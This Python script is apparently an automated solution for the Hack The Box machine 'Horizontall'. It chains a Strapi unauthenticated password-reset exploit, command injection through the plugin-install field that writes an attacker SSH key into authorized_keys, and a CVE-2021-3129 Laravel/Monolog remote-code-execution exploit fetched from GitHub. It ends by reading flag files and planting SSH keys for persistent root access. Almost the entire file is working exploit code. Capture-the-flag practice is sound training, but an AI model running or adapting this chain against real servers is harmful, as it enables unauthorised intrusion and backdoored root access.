#!/usr/bin/python3
# author : Raj Chowdhury

from pwn import *
import base64
import os
import requests
import json
import random
import string


ssh_key_location = '/tmp/id_rsa_horizontall_root_and_user'
ip_or_hostname = ''

context.log_level = 'error'


def gen_ssh():
    with os.popen('/usr/bin/ssh-keygen -t RSA -N "" -C "2>dev/null" -f ' + ssh_key_location) as p:
        pass


def foothold():
    email = "test@test.test"
    url = "http://horizontall.htb"
    new_password = random.choice(string.ascii_lowercase) * 40
    s = requests.Session()
    headers = {
        'host': 'api-prod.horizontall.htb'
    }
    r = s.get("{}/admin/strapiVersion".format(url), headers=headers)
    # version = json.loads(r.text)
    reset_request = {"email": email,
                     "url": "{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
    s.post("{}/".format(url), json=reset_request, headers=headers)
    exploit = {
        "code": {}, "password": new_password,
        "passwordConfirmation": new_password
    }
    r = s.post("{}/admin/auth/reset-password".format(url),
               json=exploit, headers=headers)
    jwt_token = r.json()['jwt']

    with open(ssh_key_location + '.pub', 'rb') as ssh_key:
        pubkey = ssh_key.read()
    data_revshell = {
        "plugin": "documentation $(mkdir ~/.ssh; echo '" + base64.b64encode(pubkey).decode('latin-1') + "' | base64 -d > ~/.ssh/authorized_keys)",
        "port": "1337"
    }
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'host': 'api-prod.horizontall.htb'
    }
    proxies = {
        'http': 'http://localhost:8800'
    }
    r = s.post('http://horizontall.htb/admin/plugins/install',
               headers=headers,
               json=data_revshell,
               # proxies=proxies
               )


def download_exploit():
    os.popen('''mkdir /tmp/exploit 2>/dev/null
    cd /tmp/exploit
    git clone https://github.com/nth347/CVE-2021-3129_exploit 2>/dev/null
    cd CVE*
    git clone https://github.com/ambionics/phpggc.git 2>/dev/null
    cd ..
    '''.replace('    ', ' ')).close()


def upload_exploit():
    os.popen('scp -i ' + ssh_key_location +
             ' -r /tmp/exploit/* strapi@horizontall.htb:/tmp/ 2>/dev/null').close()


def root():
    with ssh(user='strapi', host='horizontall.htb', keyfile=ssh_key_location) as s:
        user = s['cat /home/developer/user.txt'].decode('latin-1')
        root = s['''cd /tmp/CVE-*;python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt" | tail -n 4 | head -n 1'''].decode(
            'latin-1')
        s['cd /tmp/CVE-*;python3 exploit.py http://localhost:8000 Monolog/RCE1 "mkdir /root/.ssh; cp /opt/strapi/.ssh/authorized_keys /root/.ssh"'].decode(
            'latin-1')
    print("User : " + user + "\nRoot : " + root)
    print('use this to get a root shell : ssh -i ' +
          ssh_key_location + ' root@horizontall.htb')


if __name__ == "__main__":
    gen_ssh()
    foothold()
    download_exploit()
    upload_exploit()
    root()
